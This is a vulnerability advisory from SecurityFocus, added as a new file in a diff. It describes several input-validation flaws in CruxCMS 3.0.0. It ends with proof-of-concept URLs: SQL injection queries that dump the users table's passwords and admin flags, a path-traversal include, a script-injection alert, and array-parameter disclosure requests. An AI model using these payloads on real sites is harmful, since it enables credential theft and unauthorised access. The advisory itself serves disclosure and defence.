@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/45594/info
+
+CruxCMS is prone to multiple input-validation vulnerabilities, including multiple security-bypass issues, multiple arbitrary-file-upload issues, multiple SQL-injection issues, a local file-include issue, a cross-site-scripting issue and multiple information-disclosure issues. These issues occur because the application fails to properly sanitize user-supplied input.
+
+Exploiting these issues may allow an unauthorized user to view files and execute local scripts, execute arbitrary script code, bypass certain security restrictions, access or modify data, exploit latent vulnerabilities in the underlying database, gain administrative access, steal cookie-based authentication credentials, and launch other attacks.
+
+CruxCMS 3.0.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/cruxcms.3.0.0/search.php?search=_&max=1+UNION+ALL+SELECT+1,CONCAT_WS(0x3a,Id,Name,Password,Email,Admin),1,1+FROM+cruxcms_users
+http://www.example.com/cruxcms.3.0.0/links.php?max=1+UNION+ALL+SELECT+1,1,CONCAT_WS(0x3a,Id,Name,Password,Email,Admin),1,0x596573+FROM+cruxcms_users
+http://www.example.com/cruxcms.3.0.0/includes/template.php?style=../white.gif
+http://www.example.com/cruxcms.3.0.0/manager/login.php?message=<script>alert(123);</script>
+http://www.example.com/cruxcms.3.0.0/manager/switcher.php?style[]
+http://www.example.com/cruxcms.3.0.0/search.php?search[]
+http://www.example.com/cruxcms.3.0.0/manager/filetypes.php
+http://www.example.com/cruxcms.3.0.0/styles/andreas01.php
